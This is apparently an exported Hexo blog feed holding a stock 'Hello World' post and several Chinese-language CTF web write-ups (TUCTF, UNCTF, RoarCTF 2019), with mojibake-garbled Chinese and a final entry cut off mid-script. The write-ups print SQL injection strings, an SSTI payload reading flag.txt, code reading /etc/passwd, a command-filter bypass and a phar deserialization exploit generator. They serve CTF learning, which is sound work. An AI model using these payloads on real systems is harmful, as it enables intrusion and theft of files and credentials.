        <content type="html"><![CDATA[<h2 id="title-Hello-World"><a href="#title-Hello-World" class="headerlink" title="title: Hello World"></a>title: Hello World</h2><p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2019/12/14/hello-world/">http://blog.ccreater.top/2019/12/14/hello-world/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ‚ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tuctf2019</title>
      <link href="/2019/11/30/tuctf/"/>
      <url>/2019/11/30/tuctf/</url>
      
        <content type="html"><![CDATA[<h1 id="tuctf2019"><a href="#tuctf2019" class="headerlink" title="tuctf2019"></a>tuctf2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Router-Where-Art-Thou"><a href="#Router-Where-Art-Thou" class="headerlink" title="Router Where Art Thou?"></a>Router Where Art Thou?</h3><p> <a href="http://chal.tuctf.com:30006/0.html" target="_blank" rel="noopener">http://chal.tuctf.com:30006/0.html</a> </p><p> <a href="http://chal.tuctf.com:30006/1.html" target="_blank" rel="noopener">http://chal.tuctf.com:30006/1.html</a></p><p> <a href="http://chal.tuctf.com:30006/2.html" target="_blank" rel="noopener">http://chal.tuctf.com:30006/2.html</a>  </p><p><code>FIXME: need to use Page::includeStaticResource</code></p><p><code>2.html:603  hidden variables, we are going to set this to the session, bug fix 2157</code></p><p><a href="https://192.168.1.254/" target="_blank" rel="noopener">https://192.168.1.254/</a></p><p>â€¦.çˆ†ç ´å¯†ç è·å¾—flag</p><h3 id="Login-to-Access"><a href="#Login-to-Access" class="headerlink" title="Login to Access"></a>Login to Access</h3><p>å½“Refererä¸ä¸º<a href="http://chal.tuctf.com:30001/login.htmlæ—¶,å­˜åœ¨sqlæ³¨å…¥" target="_blank" rel="noopener">http://chal.tuctf.com:30001/login.htmlæ—¶,å­˜åœ¨sqlæ³¨å…¥</a></p><p>å½“Referer: <a href="http://chal.tuctf.com:30001/login.hmtlæ—¶sql" target="_blank" rel="noopener">http://chal.tuctf.com:30001/login.hmtlæ—¶sql</a> æ³¨å…¥è¢«è¿‡æ»¤</p><p>å¯¹ç¬¬ä¸€ç§æƒ…å†µsqlæ³¨å…¥å¾—åˆ°</p><pre><code class="python">#database:information_schema,challenge,mysql,performance_schema,sys #table:users#columns:user,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS#user,password,USER : dave,hunter2,dave</code></pre><p>åˆ©ç”¨å¾—åˆ°çš„è´¦å·å¯†ç ç›´æ¥åœ¨ç¬¬äºŒæ­¥ç™»é™†æ— æ•ˆ,çŒœæµ‹ç¬¬äºŒæ­¥è¿˜è¦sqlæ³¨å…¥</p><ul><li>sqlæ³¨å…¥</li></ul><pre><code class="python">dave&#39;+or+1%23 xdave&quot;+or+1%23 xdave&quot;)+or+1%23 xdave&#39;)+or+1%23 x\è½¬ä¹‰&#39;æˆ–&quot;æ¥é€ƒé€¸å¤±è´¥</code></pre><p>å®½å­—èŠ‚æ³¨å…¥:</p><pre><code class="python">#username=%2bsleep(10)&amp;password=%bf%5c&quot; x#username=%2bsleep(10)&amp;password=%bf%5c&#39; x#username=%bf%5c&quot;&amp;password=%2bsleep(10) x#username=%bf%5c&#39;&amp;password=%2bsleep(10) x</code></pre><p>sqlæ³¨å…¥ç‚¹æ—¶usernameè¿˜æ˜¯password</p><p>æ˜¯å•å¼•å·è¿˜æ˜¯åŒå¼•å·é—­åˆ</p><p>è¿‡æ»¤äº†å“ªäº›å­—ç¬¦ï¼Œè½¬ä¹‰äº†å“ªäº›å­—ç¬¦</p><p>We then looked at the challengeâ€™s description again and realized that there might be backup of file somewhere. We then tried to get the <strong>login.php.bak</strong>.</p><p><img src="https://khroot.com/wp-content/uploads/2019/11/image-201.png" alt="img"></p><p>Surprise, there really is a backup file there. Letâ€™s see what is inside.</p><p><img src="https://khroot.com/wp-content/uploads/2019/11/image-202-1024x385.png" alt="img"></p><p>We found the flag, and it is <code>TUCTF{b4ckup5_0f_php?_1t5_m0r3_c0mm0n_th4n_y0u_th1nk}</code></p><h3 id="The-Droid-Youâ€™re-Looking-For"><a href="#The-Droid-Youâ€™re-Looking-For" class="headerlink" title="The Droid Youâ€™re  Looking For"></a>The Droid Youâ€™re  Looking For</h3><p>çœ‹åˆ°droidæƒ³åˆ°robots.txt,ç›´æ¥è®¿é—®æç¤ºæ²¡æœ‰æƒé™</p><p>å› ä¸ºrobots.txtæ˜¯ç»™çˆ¬è™«çœ‹çš„,æ‰€ä»¥å»ç™¾åº¦äº†ä¸€ä¸ªgoogleçˆ¬è™«çš„user-agent:</p><pre><code>Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1;</code></pre><p>robots.txt</p><pre><code>User-agent: *Disallow: googleagentflagfoundhere.html</code></pre><p>TUCTF{463nt_6006l3_r3p0rt1n6_4_r0b0t}</p><h3 id="And-Now-For-Something-Completely-Different"><a href="#And-Now-For-Something-Completely-Different" class="headerlink" title="And Now, For Something Completely Different"></a>And Now, For Something Completely Different</h3><pre><code class="python">Traceback (most recent call last):  File &quot;/usr/local/lib/python2.7/dist-packages/tornado/web.py&quot;, line 1509, in _execute    result = method(*self.path_args, **self.path_kwargs)  File &quot;/usr/src/app/class_website.py&quot;, line 87, in post    if len(name) == 0 or len(phone_num) == 0 or len(email) == 0 or len(passwd2) == 0 or passw != passw2:NameError: global name &#39;passwd2&#39; is not defined</code></pre><p>åœ¨ç½‘é¡µä¸­å‘ç°</p><pre><code class="html">&lt;!-- TODO: add /welcome/test --&gt;</code></pre><p>æ‰“å¼€åªæœ‰welcome test &lt;==&gt; /welcome/test</p><p>çŒœæµ‹æ˜¯ssti</p><pre><code>{{__import__('os').popen('cat flag.txt').read()}}</code></pre><p> TUCTF{4lw4y5_60_5h0pp1n6_f0r_fl465} </p><h3 id="Cute-Animals-Company"><a href="#Cute-Animals-Company" class="headerlink" title="Cute Animals Company"></a>Cute Animals Company</h3><p>ä¿®æ”¹cookieè·å¾—ç™»é™†æƒé™</p><p>sqlmapå¾—åˆ°å¯†ç </p><p>file:///etc/passwdè·å¾—flag???</p><p>httpè®¿é—®éƒ½ä¸è¡Œçš„å‘€</p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2019/11/30/tuctf/">http://blog.ccreater.top/2019/11/30/tuctf/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unctf2019</title>
      <link href="/2019/10/25/unctf2019/"/>
      <url>/2019/10/25/unctf2019/</url>
      
        <content type="html"><![CDATA[<h1 id="unctf2019"><a href="#unctf2019" class="headerlink" title="unctf2019"></a>unctf2019</h1><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><pre><code class="php">&lt;?php    highlight_file(__FILE__);    $a = $_GET[&#39;a&#39;];    $b = $_GET[&#39;b&#39;]; // try bypass it    if (preg_match(&quot;/\&#39;|\&quot;|,|;|\`|\\|\*|\n|\t|\xA0|\r|\{|\}|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $a))        $a = &quot;&quot;;        $a =&#39;&quot;&#39; . $a . &#39;&quot;&#39;;    if (preg_match(&quot;/\&#39;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\{|\}|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $b))        $b = &quot;&quot;;        $b = &#39;&quot;&#39; . $b . &#39;&quot;&#39;;     $cmd = &quot;file $a $b&quot;;      str_replace(&quot; &quot;,&quot;&quot;,&quot;$cmd&quot;);      system($cmd);?&gt;</code></pre><p>ç”¨<code>a=\&amp;b=\</code>æ¥é€ƒè„±å¼•å·</p><p>ç”¨?æ¥åŒ¹é…,ä½†æ˜¯éšè—æ–‡ä»¶æ˜¯æ— æ³•æ˜¾ç¤ºçš„è¦è‡ªå·±åœ¨å‰é¢åŠ ä¸€ä¸ª.</p><p><code>file &quot;\&quot; -f &quot;  \&quot;</code></p><p>æœ€ååœ¨<code>http://101.71.29.5:10054/.F1jh_/h3R3_1S_your_F1A9.txt</code>é‡Œæ‰¾åˆ°flag</p><p><code>unctf{86dfe85d7c5842c5c04adae104193ee1}</code></p><h2 id="NSB-RESET-PASSWORD"><a href="#NSB-RESET-PASSWORD" class="headerlink" title="NSB RESET PASSWORD"></a>NSB RESET PASSWORD</h2><p>é¢˜ç›®è¯´æ˜¯é‡ç½®å¯†ç ,åˆšå¼€å§‹æˆ‘æƒ³çš„æ˜¯è¶Šæƒ</p><p>åé¢æäº†å¥½ä¹…éƒ½ä¸è¡Œã€‚åé¢è¯•ç€å¼„äº†ä¸€ä¸‹å‘ç°ä¸€ä¸ªéªŒè¯ç å¯ä»¥å¤šæ¬¡ç”¨.</p><p>æˆ‘å°±çŒœæœ‰å¯èƒ½æ˜¯æ¡ä»¶ç«äº‰</p><p>å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ç”¨æ”¶åˆ°çš„éªŒè¯ç é‡ç½®ï¼Œç„¶åå†ç”¨adminè´¦å·è¯·æ±‚é‡ç½®å¯†ç </p><p>ç„¶åç›´æ¥è·³åˆ°ä¿®æ”¹å¯†ç çš„ç•Œé¢,ä¿®æ”¹ä¸€ä¸‹å°±å‡ºæ¥äº†</p><p> flag{175f3098f80735ddfdfbd4588f6b1082} </p><h2 id="å¸®èµµæ€»å¾å©š"><a href="#å¸®èµµæ€»å¾å©š" class="headerlink" title="å¸®èµµæ€»å¾å©š"></a>å¸®èµµæ€»å¾å©š</h2><p>ç›²çŒœsqlæ³¨å…¥</p><p>è½¬ä¹‰:<code>&#39;,&quot;,\,#</code></p><p>è¿˜ç»™äº†æˆ‘ä»¬ä¸€ä¸ªphpinfo?????</p><p>æˆ‘ä¹Ÿæƒ³å¸®èµµæ€»å¾å©šå•Šï¼Œå¯æ˜¯æˆ‘æ²¡æœºä¼š</p><p>remember_me æ˜¯å¦å¯ä»¥æ³¨å…¥?</p><h2 id="inject-twice"><a href="#inject-twice" class="headerlink" title="inject twice"></a>inject twice</h2><p>é¢˜ç›®æ˜¯sql-labçš„æºç </p><p>äºŒæ¬¡æ³¨å…¥ç‚¹</p><pre><code class="php">if (isset($_POST[&#39;submit&#39;])){    # Validating the user input........    $username= $_SESSION[&quot;username&quot;];    $curr_pass= mysql_real_escape_string($_POST[&#39;current_password&#39;]);    $pass= mysql_real_escape_string($_POST[&#39;password&#39;]);    $re_pass= mysql_real_escape_string($_POST[&#39;re_password&#39;]);    if($pass==$re_pass)    {            $sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; &quot;;        $res = mysql_query($sql) or die(&#39;You tried to be smart, Try harder!!!! :( &#39;);        $row = mysql_affected_rows();        echo &#39;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#39;;        echo &#39;&lt;center&gt;&#39;;        if($row==1)        {            echo &quot;Password successfully updated&quot;;        }        else        {            header(&#39;Location: failed.php&#39;);            //echo &#39;You tried to be smart, Try harder!!!! :( &#39;;        }    }    else    {        echo &#39;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&lt;center&gt;&#39;;        echo &quot;Make sure New Password and Retype Password fields have same value&quot;;        header(&#39;refresh:2, url=index.php&#39;);    }}?&gt;</code></pre><p>ä½†æ˜¯å¾—åˆ°adminè´¦å·å,å¹¶æ²¡æœ‰å¾—åˆ°flag,ä¼°è®¡è¦æŠŠæ•°æ®åº“ç»™æºœä¸€åœˆã€‚</p><p>é»‘åå•:<code>or,</code></p><p>æ³¨å†Œä¸€ä¸ª<code>hello\</code>çš„è´¦å·,å°±å¯ä»¥ç”¨,currentpassæ¥æ³¨å…¥,ä½†æ˜¯ç¯å¢ƒç‚¸äº†,æˆ‘sleepäº†ä¸€ä¸‹å°±å¥‡å¥‡æ€ªæ€ªäº†</p><p>//////////////???????????????????</p><p>currentpass=<code>/**/or/**/1-- a</code></p><p>æ•°æ®åº“å<code>or (SELECT substr(hex(group_concat(schema_name)),1,1) FROM information_schema.schemata)=char(54)-- a</code></p><p>information_schema,metinfo,mysql,performance_schema,security,sys</p><p>è¡¨:</p><p><code>GROUP_CONCAT(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA=database()</code></p><p>security:emails,fl4g,referers,uagents,users</p><p>åˆ—å</p><p>fl4g:f1ag</p><p>æœ€åçš„flag<code>UNCTF{585ae8df50433972bb6ebd76e3ebd9f4}</code></p><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>åˆæ˜¯ä¸€ä¸ªvueåº”ç”¨</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8cz6r1f4pj30ep0d2wfe.jpg" alt="image.png"></p><p>åœ¨ä»£ç ä¸­å‘ç°</p><p>/calc: å¯ä»¥å‘½ä»¤æ‰§è¡Œ,ä½†æ˜¯å´æ²¡æœ‰åŠæ³•æ‰¾åˆ°æœ‰æ•ˆçš„åˆ©ç”¨æ–¹å¼</p><p>åç«¯æ˜¯node.js</p><p>version: v10.12.0 </p><p>cwd:/usr</p><p>/usrç›®å½•</p><p> bin,games,include,lib,local,sbin,share,src </p><p>res.end(require(â€˜fsâ€™).readFileSync(â€˜/etc/passwdâ€™).toString())</p><p>require(â€˜fsâ€™).readdirSync.(â€˜/etc/passwdâ€™).toString()</p><p>åœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°flag</p><p>  flag{0e4d1980ef6f8a81428f83e8e1c6e22b} </p><p>æœ€åè¿˜æ˜¯æ™šäº†ä¸€åˆ†é’Ÿ</p><p>çœ‹æ¥æ”¹å¤©è¦çœ‹çœ‹nodejsçš„ä¸œä¸œ?</p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2019/10/25/unctf2019/">http://blog.ccreater.top/2019/10/25/unctf2019/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å·…å³°æå®¢</title>
      <link href="/2019/10/19/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/"/>
      <url>/2019/10/19/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="å·…å³°æå®¢"><a href="#å·…å³°æå®¢" class="headerlink" title="å·…å³°æå®¢"></a>å·…å³°æå®¢</h1><h2 id="aweb-1"><a href="#aweb-1" class="headerlink" title="aweb_1"></a>aweb_1</h2><p><a href="mailto:abcdefghij1@qq.com">abcdefghij1@qq.com</a></p><p>é»‘åå•:union</p><p><code>fuckyoufuck&#39;/**/or/**/1^&#39;0</code></p><p>æœ€åpayload:<code>admin&#39;/*ffuuucckyou*/or/**/&#39;</code></p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>å·²çŸ¥æ–‡ä»¶:<code>file.php,download.php,index.php,upload_file.php</code></p><p>download.php</p><pre><code class="php">$name = $_GET[&#39;name&#39;];$url = $_SERVER[&#39;QUERY_STRING&#39;];if (isset($name)){    if (preg_match(&#39;/\.|etc|var|tmp|usr/i&#39;, $url)){        echo(&quot;hacker!&quot;);    }    else{        if (preg_match(&#39;/base|class|file|function|index|upload_file/i&#39;, $name)){            echo (&quot;hacker!&quot;);        }        else{            $name = safe_replace($name);            if (preg_match(&#39;/base|class|file|function|index|upload_file/i&#39;, $name)){                $filename = $name.&#39;.php&#39;;                $dir =&quot;./&quot;;                $down_host = $_SERVER[&#39;HTTP_HOST&#39;].&#39;/&#39;;                if(file_exists(__DIR__.&#39;/&#39;.$dir.$filename)){                    $file = fopen ( $dir.$filename, &quot;rb&quot; );                    Header ( &quot;Content-type: application/octet-stream&quot; );                    Header ( &quot;Accept-Ranges: bytes&quot; );                    Header ( &quot;Accept-Length: &quot; . filesize ( $dir.$filename ) );                    Header ( &quot;Content-Disposition: attachment; filename=&quot; . $filename );                    echo fread ( $file, filesize ( $dir . $filename ) );                    fclose ( $file );                    exit ();                }else{                    echo (&quot;file doesn&#39;t exist.&quot;);                }            }            if (preg_match(&#39;/flag/i&#39;, $name)){                echo (&quot;hacker!&quot;);            }        }    }}</code></pre><p>file.php</p><pre><code class="php">&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;);  include &#39;function.php&#39;; include &#39;class.php&#39;;$file = $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; if(empty($file)) {     echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; }if(preg_match(&#39;/http|https|file:|gopher|dict|\.\/|\.\.|flag/i&#39;,$file)) {            die(&#39;hacker!&#39;); }elseif(!preg_match(&#39;/\//i&#39;,$file)){    die(&#39;hacker!&#39;);}$show = new Show(); if(file_exists($file)) {     $show-&gt;source = $file;     $show-&gt;_show(); } else if (!empty($file)){     die(&#39;file doesn\&#39;t exists.&#39;); } ?&gt;</code></pre><p>function.php</p><pre><code class="php">&lt;?php//show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text/html;charset=utf-8&quot;); error_reporting(0); function upload_file_do() {     global $_FILES;     $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;]).&quot;.jpg&quot;;     //mkdir(&quot;upload&quot;,0777);     if(file_exists(&quot;upload/&quot; . $filename)) {         unlink($filename);     }     move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename);     echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;ä¸Šä¼ æˆåŠŸ!&quot;);&lt;/script&gt;&#39;; } function upload_file() {     global $_FILES;     if(upload_file_check()) {         upload_file_do();     } } function upload_file_check() {     global $_FILES;     $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;);     $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]);     $extension = end($temp);     if(empty($extension)) {         //echo &quot;&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:&quot; . &quot;&lt;h4/&gt;&quot;;     }     else{         if(in_array($extension,$allowed_types)) {             return true;         }         else {             echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#39;;             return false;         }     } } ?&gt; </code></pre><p>class.php</p><pre><code class="php">&lt;?phpclass Show{    public $source;    public $str;    public function __construct($file)    {        $text= $this-&gt;source;        $text = base64_encode(file_get_contents($text));        return $text;    }    public function __toString()    {        $text= $this-&gt;source;        $text = base64_encode(file_get_contents($text));        return $text;    }    public function __set($key,$value)    {        $this-&gt;$key = $value;    }    public function _show()    {        if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|flag/i&#39;,$this-&gt;source)) {            die(&#39;hacker!&#39;);        } else {            highlight_file($this-&gt;source);        }    }    public function __wakeup()    {        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) {            echo &quot;hacker~&quot;;            $this-&gt;source = &quot;index.php&quot;;        }    }}class S6ow{    public $file;    public $params;    public function __construct()    {        $this-&gt;params = array();    }    public function __get($key)    {        return $this-&gt;params[$key];    }    public function __call($name, $arguments)    {        if($this-&gt;{$name})            $this-&gt;{$this-&gt;{$name}}($arguments);    }    public function file_get($value)    {        echo $this-&gt;file;    }}class Sh0w{    public $test;    public $str;    public function __construct($name)    {        $this-&gt;str = new Show(&#39;index.php&#39;);        $this-&gt;str-&gt;source = $this-&gt;test;    }    public function __destruct()    {        $this-&gt;str-&gt;_show();    }}?&gt;</code></pre><p>åˆ†æå‘ç°ä¸€å †ç±»ï¼Œä¸”file_existså¯ä»¥è§¦å‘pharååºåˆ—åŒ–æ¼æ´</p><p>popé“¾:</p><p><code>sh0w($str=new S6ow)-&gt;S6ow($file=new Show,$_show=&quot;file_get&quot;)-&gt;Show($source=&#39;/flag&#39;)</code></p><pre><code class="php">&lt;?phpclass Show{    public $source;    public $str;    public function __construct()    {        $this-&gt;source=&quot;/flag&quot;;        $this-&gt;str=&quot;&quot;;        $text= $this-&gt;source;    }    public function __toString()    {        $text= $this-&gt;source;    }}class S6ow{    public $file;    public $params;    public $_show;    public function __construct()    {        $this-&gt;params = array();        $this-&gt;file=new Show;        $this-&gt;_show=&quot;file_get&quot;;    }    public function __get($key)    {        return $this-&gt;params[$key];    }    public function __call($name, $arguments)    {        $name=&quot;_show&quot;;        print($name);        print($this-&gt;{$name});        if($this-&gt;{$name})            $this-&gt;{$this-&gt;{$name}}($arguments);            //$this-&gt;file_get($arguments);            //$this-&gt;{$name}=&quot;file_get&quot;            //$name=_show            //$file=new Show;    }    public function file_get($value)    {    }}class Sh0w{    public $test;    public $str;    public function __construct()    {        $this-&gt;str =new S6ow;        $this-&gt;test=&quot;&quot;;    }    public function __destruct()    {        $this-&gt;str-&gt;_show();    }}$a=new Sh0w();@unlink(&quot;hello.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;); //åç¼€åå¿…é¡»ä¸ºphar,pharä¼ªåè®®ä¸ç”¨pharåç¼€$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stub,åªè¦åé¢éƒ¨åˆ†ä¸º__HALT_COMPILER(); $phar-&gt;setMetadata($a); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶//ç­¾åè‡ªåŠ¨è®¡ç®—$phar-&gt;stopBuffering();?&gt;</code></pre><p>flag{a592b240-32ae-4381-a0ab-83790c98ca28}</p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2019/10/19/å·…å³°æå®¢/">http://blog.ccreater.top/2019/10/19/å·…å³°æå®¢/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>roarctf2019</title>
      <link href="/2019/10/15/roarctf2019/"/>
      <url>/2019/10/15/roarctf2019/</url>
      
        <content type="html"><![CDATA[<h1 id="roarctf2019"><a href="#roarctf2019" class="headerlink" title="roarctf2019"></a>roarctf2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="easycalc"><a href="#easycalc" class="headerlink" title="easycalc"></a>easycalc</h3><h4 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h4><pre><code class="php">&lt;?phperror_reporting(0);if(!isset($_GET[&#39;num&#39;])){    show_source(__FILE__);}else{        $str = $_GET[&#39;num&#39;];        $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];        foreach ($blacklist as $blackitem) {                if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $str)) {                        die(&quot;what are you want to do?&quot;);                }        }        eval(&#39;echo &#39;.$str.&#39;;&#39;);}?&gt;</code></pre><h4 id="è§£æ³•ä¸€-è‚å°±å®Œäº‹"><a href="#è§£æ³•ä¸€-è‚å°±å®Œäº‹" class="headerlink" title="è§£æ³•ä¸€ è‚å°±å®Œäº‹"></a>è§£æ³•ä¸€ è‚å°±å®Œäº‹</h4><p>å¼ºè¡Œç»•è¿‡é™åˆ¶</p><p>å…³é”®:<code>((10000000000000).(0)){3}</code>=&gt;E</p><p>pythonè„šæœ¬</p><pre><code class="python">arr={    &quot;0&quot;:&#39;&#39;&#39;((0).(0)){0}&#39;&#39;&#39;,    &quot;1&quot;:&#39;&#39;&#39;((1).(0)){0}&#39;&#39;&#39;,    &quot;2&quot;:&#39;&#39;&#39;((2).(0)){0}&#39;&#39;&#39;,    &quot;3&quot;:&#39;&#39;&#39;((3).(0)){0}&#39;&#39;&#39;,    &quot;4&quot;:&#39;&#39;&#39;((4).(0)){0}&#39;&#39;&#39;,    &quot;5&quot;:&#39;&#39;&#39;((5).(0)){0}&#39;&#39;&#39;,    &quot;6&quot;:&#39;&#39;&#39;((6).(0)){0}&#39;&#39;&#39;,    &quot;7&quot;:&#39;&#39;&#39;((7).(0)){0}&#39;&#39;&#39;,    &quot;8&quot;:&#39;&#39;&#39;((8).(0)){0}&#39;&#39;&#39;,    &quot;9&quot;:&#39;&#39;&#39;((9).(0)){0}&#39;&#39;&#39;,    &quot;-&quot;: &quot;((-1).(0)){0}&quot;,    &quot;.&quot; :&quot;((1.1).(0)){1}&quot;,    &quot;E&quot;: &quot;((10000000000000000000).(1)){3}&quot;,    &quot;p&quot;:&quot;((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))&quot;,    &quot;$&quot;:&quot;((((-1).(0)){0})&amp;(((4).(0)){0}))&quot;,    &quot;l&quot;:&quot;((((-1).(0)){0})&amp;(((4).(0)){0}))|(~((0).(0)){0})&amp;~((~((8).(0)){0})&amp;(~((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))))&quot;,    &quot;H&quot;: &quot;(~((0).(0)){0})&amp;~((~((8).(0)){0})&amp;(~((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))))&quot;,    &quot;Z&quot; : &quot;(~(((((-1).(0)){0})&amp;(((4).(0)){0}))))&amp;(~((~(((8).(0)){0}))&amp;((~(((2).(0)){0}))&amp;(~(((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1})))))))&quot;,    &quot;v&quot; :&quot;(((2).(0)){0})|((~((1).(0)){0})&amp;((10000000000000000000).(1)){3})&quot;,    &quot;D&quot; 